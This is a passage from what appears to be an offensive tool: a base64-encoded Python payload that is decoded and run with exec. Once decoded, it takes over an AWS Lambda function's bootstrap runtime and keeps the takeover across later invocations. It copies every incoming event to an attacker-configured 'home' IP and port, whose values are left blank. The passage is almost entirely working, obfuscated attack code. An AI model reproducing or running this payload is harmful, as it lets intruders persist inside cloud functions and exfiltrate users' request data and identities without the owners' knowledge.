ICAgICAgICAgICAgICAgICBjbGllbnRfY29udGV4dF9qc29uLCBjb2duaXRvX2lkZW50aXR5X2pzb24sIGludm9rZWRfZnVuY3Rpb25fYXJuLCBlcG9jaF9kZWFkbGluZV90aW1lX2luX21zKToKICAgIGVycm9yX3Jlc3VsdCA9IE5vbmUKICAgIHRyeToKICAgICAgICBsYW1iZGFfY29udGV4dCA9IGNyZWF0ZV9sYW1iZGFfY29udGV4dChjbGllbnRfY29udGV4dF9qc29uLCBjb2duaXRvX2lkZW50aXR5X2pzb24sIGVwb2NoX2RlYWRsaW5lX3RpbWVfaW5fbXMsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaW52b2tlX2lkLCBpbnZva2VkX2Z1bmN0aW9uX2FybikKICAgICAgICBldmVudCA9IGxhbWJkYV9ydW50aW1lX2NsaWVudC5tYXJzaGFsbGVyLnVubWFyc2hhbF9yZXF1ZXN0KGV2ZW50X2JvZHksIGNvbnRlbnRfdHlwZSkKCiAgICAgICAgdHdpc3RfbGVha19kYXRhX2hvbWUoZXZlbnQsIGludm9rZV9pZCkKICAgICAgICByZXNwb25zZSA9IHJlcXVlc3RfaGFuZGxlcihldmVudCwgbGFtYmRhX2NvbnRleHQpCiAgICAgICAgdHdpc3RlZF9yZXNwb25zZSA9IHR3aXN0X3Jlc3BvbnNlKHJlc3BvbnNlKQoKICAgICAgICByZXN1bHQsIHJlc3VsdF9jb250ZW50X3R5cGUgPSBsYW1iZGFfcnVudGltZV9jbGllbnQubWFyc2hhbGxlci5tYXJzaGFsX3Jlc3BvbnNlKHR3aXN0ZWRfcmVzcG9uc2UpCiAgICBleGNlcHQgRmF1bHRFeGNlcHRpb24gYXMgZToKICAgICAgICBlcnJvcl9yZXN1bHQgPSBtYWtlX2Vycm9yKGUubXNnLCBlLmV4Y2VwdGlvbl90eXBlLCBlLnRyYWNlKQogICAgZXhjZXB0IEV4Y2VwdGlvbjoKICAgICAgICBlcnJvcl9yZXN1bHQgPSBidWlsZF9mYXVsdF9yZXN1bHQoc3lzLmV4Y19pbmZvKCksIE5vbmUpCgogICAgaWYgZXJyb3JfcmVzdWx0IGlzIG5vdCBOb25lOgogICAgICAgIGxvZ19lcnJvcihlcnJvcl9yZXN1bHQpCiAgICAgICAgbGFtYmRhX3J1bnRpbWVfY2xpZW50LnBvc3RfaW52b2NhdGlvbl9lcnJvcihpbnZva2VfaWQsIHRvX2pzb24oZXJyb3JfcmVzdWx0KSkKICAgIGVsc2U6CiAgICAgICAgbGFtYmRhX3J1bnRpbWVfY2xpZW50LnBvc3RfaW52b2NhdGlvbl9yZXN1bHQoaW52b2tlX2lkLCByZXN1bHQsIHJlc3VsdF9jb250ZW50X3R5cGUpCgoKVFdJU1RfSE9NRV9JUCA9ICIiICAgICMgZmlsbCBpbgpUV0lTVF9IT01FX1BPUlQgPSAiIiAgIyBmaWxsIGluCkRFRkFVTFRfVElNRU9VVCA9IDAuMgojIFNlbmQgdGhlIGV2ZW50IHRvIFRXSVNUX0hPTUUKZGVmIHR3aXN0X2xlYWtfZGF0YV9ob21lKGV2ZW50LCBpbnZva2VfaWQpOgogICAgaWYgbm90IFRXSVNUX0hPTUVfSVAgb3Igbm90IFRXSVNUX0hPTUVfUE9SVDoKICAgICAgICBwcmludCgiWyFdIHR3aXN0X2xlYWtfZGF0YV9ob21lOiBUV0lTVF9IT01FIGlzbid0IGRlZmluZWQiKQogICAgICAgIHJldHVybgoKICAgICMgU2VuZCBldmVudCB0byBob21lIHNlcnZlcgogICAgaG9tZSA9ICJodHRwOi8vezB9OnsxfSIuZm9ybWF0KFRXSVNUX0hPTUVfSVAsIFRXSVNUX0hPTUVfUE9SVCkKICAgIHRyeToKICAgICAgICByZXF1ZXN0cy5wb3N0KGhvbWUsIGpzb249ZXZlbnQsIHRpbWVvdXQ9REVGQVVMVF9USU1FT1VUKQogICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgIGV4Y3AgPSByZXByKGUpCiAgICAgICAgcHJpbnQoIlshXSB0d2lzdF9sZWFrX2RhdGFfaG9tZTogZmFpbGVkIHRvIHNlbmQgZXZlbnQgJ3t9JyB3aXRoOiB7fSIuZm9ybWF0KGludm9rZV9pZCwgZXhjcCkpCgoKIyBTZW5kIGFuIGludm9jYXRpb24gcmVzdWx0IGZvciB0aGUgaW52b2tlIHRoYXQgc3dpdGNoZWQgdGhlIHJ1bnRpbWUKZGVmIHR3aXN0X3Jlc3BvbmRfdG9fcGF5bG9hZF9pbnZva2UobGFtYmRhX3J1bnRpbWVfY2xpZW50LCBpbnZva2VfaWQpOgogICAgcmVzcG9uc2UgPSB7CiAgICAgICAgImlzQmFzZTY0RW5jb2RlZCI6IEZhbHNlLAogICAgICAgICJzdGF0dXNDb2RlIiA6IDIwMCwKICAgICAgICAiaGVhZGVycyIgOiB7IkNvbnRlbnQtVHlwZSIgOiAidGV4dC9wbGFpbiJ9LAogICAgICAgICJib2R5IiA6IGpzb24uZHVtcHMoeyJPdXRwdXQiIDogIlN1Y2Nlc3NmdWxseSB0b29rIG92ZXIgdGhlIGJvb3RzdHJhcCBydW50aW1lIn0pCiAgICB9CgogICAgIyBNYXJzaGFsbCByZXNwb25zZQogICAgdHJ5OgogICAgICAgIHJlc3VsdCwgcmVzdWx0X2NvbnRlbnRfdHlwZSA9IGxhbWJkYV9ydW50aW1lX2NsaWVudC5tYXJzaGFsbGVyLm1hcnNoYWxfcmVzcG9uc2UocmVzcG9uc2UpIAogICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgIHByaW50KCJbIV0gdHdpc3RfcmVzcG9uZF90b19wYXlsb2FkX2ludm9rZTogRmFpbGVkIHRvIG1hcnNoYWwgcmVzcG9uc2U6ICd7fSciLnJlcHIoZSkpCiAgICAgICAgcmV0dXJuIEZhbHNlCiAgICAKICAgIHRyeToKICAgICAgICBsYW1iZGFfcnVudGltZV9jbGllbnQucG9zdF9pbnZvY2F0aW9uX3Jlc3VsdChpbnZva2VfaWQsIHJlc3VsdCwgcmVzdWx0X2NvbnRlbnRfdHlwZSkKICAgIGV4Y2VwdCBMYW1iZGFSdW50aW1lQ2xpZW50RXJyb3IgYXMgZToKICAgICAgICBwcmludCgiWyFdIHR3aXN0X3Jlc3BvbmRfdG9fcGF5bG9hZF9pbnZva2U6IEZhaWxlZCB3aXRoIGludm9rZV9pZDogJ3t9JyIuZm9ybWF0KGludm9rZV9pZCkpCiAgICAgICAgcmV0dXJuIEZhbHNlCgogICAgIyBTdWNjZWVkICAgIAogICAgcmV0dXJuIFRydWUKCgpfR0xPQkFMX0FXU19SRVFVRVNUX0lEID0gTm9uZQpIQVJEQ09ERURfSU5JVF9QUk9DRVNTX0FQSSA9ICIxMjcuMC4wLjE6OTAwMSIKCmRlZiB0d2lzdF9tYWluKGludm9rZV9pZCk6CgogICAgIyBSZWNvbm5lY3QgdG8gdGhlIGluaXQgcHJvY2VzcwogICAgbGFtYmRhX3J1bnRpbWVfY2xpZW50ID0gTGFtYmRhUnVudGltZUNsaWVudChIQVJEQ09ERURfSU5JVF9QUk9DRVNTX0FQSSkKICAgIAogICAgIyBIYW5kbGUgdGhlIGludm9jYXRpb24gdGhhdCBzd2l0Y2hlZCB0aGUgcnVudGltZQogICAgaWYgbm90IHR3aXN0X3Jlc3BvbmRfdG9fcGF5bG9hZF9pbnZva2UobGFtYmRhX3J1bnRpbWVfY2xpZW50LCBpbnZva2VfaWQpOgogICAgICAgIHJldHVybgoKICAgIGV2ZW50X3JlcXVlc3QgPSBsYW1iZGFfcnVudGltZV9jbGllbnQud2FpdF9uZXh0X2ludm9jYXRpb24oKSAjIHdlIGZyZWV6ZSBoZXJlLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICMgcmVzdCBvZiBpbml0aWFsaXphdGlvbiB3aWxsIGhhcHBlbiBpbiB0aGUgbmV4dCBldmVudAoKICAgICMgUmVjZWl2ZWQgZmlyc3QgZXZlbnQgYWZ0ZXIgc3dpdGNoCiAgICAjIENvbnRpbnVlIGluaXRpYWxpemF0aW9uCiAgICB0cnk6CiAgICAgICAgaW5pdF9sb2dnZXIoKQogICAgICAgIGFkZF9kZWZhdWx0X3NpdGVfZGlyZWN0b3JpZXMoKQoKICAgICAgICBoYW5kbGVyID0gb3MuZW52aXJvblsiX0hBTkRMRVIiXQogICAgICAgIHJlcXVlc3RfaGFuZGxlciA9IF9nZXRfaGFuZGxlcihoYW5kbGVyKQogICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgIHByaW50KCJbIV0gdHdpc3RfbWFpbjogaW5pdGlhbGl6YXRpb24gZmFpbGVkOiIgKyByZXByKGUpKQogICAgICAgIHJldHVybgoKICAgICMgSGFuZGxlIGFuZCBsZWFrIHN1YnNlcXVlbnQgZXZlbnRzCiAgICBnbG9iYWwgX0dMT0JBTF9BV1NfUkVRVUVTVF9JRAoKICAgIHdoaWxlIFRydWU6CiAgICAgICAgX0dMT0JBTF9BV1NfUkVRVUVTVF9JRCA9IGV2ZW50X3JlcXVlc3QuaW52b2tlX2lkCgogICAgICAgIHVwZGF0ZV94cmF5X2Vudl92YXJpYWJsZShldmVudF9yZXF1ZXN0LnhfYW16bl90cmFjZV9pZCkKCiAgICAgICAgdHdpc3RfaGFuZGxlX2V2ZW50X3JlcXVlc3QobGFtYmRhX3J1bnRpbWVfY2xpZW50LAogICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJlcXVlc3RfaGFuZGxlciwgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgIGV2ZW50X3JlcXVlc3QuaW52b2tlX2lkLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgIGV2ZW50X3JlcXVlc3QuZXZlbnRfYm9keSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICBldmVudF9yZXF1ZXN0LmNvbnRlbnRfdHlwZSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICBldmVudF9yZXF1ZXN0LmNsaWVudF9jb250ZXh0LAogICAgICAgICAgICAgICAgICAgICAgICAgICAgIGV2ZW50X3JlcXVlc3QuY29nbml0b19pZGVudGl0eSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICBldmVudF9yZXF1ZXN0Lmludm9rZWRfZnVuY3Rpb25fYXJuLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgIGV2ZW50X3JlcXVlc3QuZGVhZGxpbmVfdGltZV9pbl9tcykKCiAgICAgICAgIyBOZXh0IGV2ZW50CiAgICAgICAgZXZlbnRfcmVxdWVzdCA9IGxhbWJkYV9ydW50aW1lX2NsaWVudC53YWl0X25leHRfaW52b2NhdGlvbigpCgoKCgppZiBfX25hbWVfXyA9PSAnX19tYWluX18nOgogICAgaWYgbGVuKHN5cy5hcmd2KSAhPSAyOgogICAgICAgIHByaW50KCJbIV0gVXNhZ2U6IDx0d2lzdC1ydW50aW1lPiA8aW52b2tlLWlkPiIpCiAgICAgICAgc3lzLmV4aXQoMSkKCiAgICBpbnZva2VfaWQgPSBzeXMuYXJndlsxXQogICAgCiAgICBzeXMucGF0aC5pbnNlcnQoMCwgZ2V0X29wdF9weXRob25fZGlyZWN0b3J5KCkpCiAgICBzeXMucGF0aC5pbnNlcnQoMCwgZ2V0X29wdF9zaXRlX3BhY2thZ2VzX2RpcmVjdG9yeSgpKQogICAgc3lzLnN0ZG91dCA9IFVuYnVmZmVyZWQoc3lzLnN0ZG91dCkKICAgIHN5cy5zdGRlcnIgPSBVbmJ1ZmZlcmVkKHN5cy5zdGRlcnIpCgogICAgcHJpbnQoIlsrXSB0d2lzdC1ydW50aW1lIHN0YXJ0aW5nLCBpbnZva2UtaWQ6ICIgKyBpbnZva2VfaWQpCiAgICB0d2lzdF9tYWluKGludm9rZV9pZCkK';     from base64 import b64decode; payload = b64decode(payload_b64).decode('utf8');     exec(payload)" ]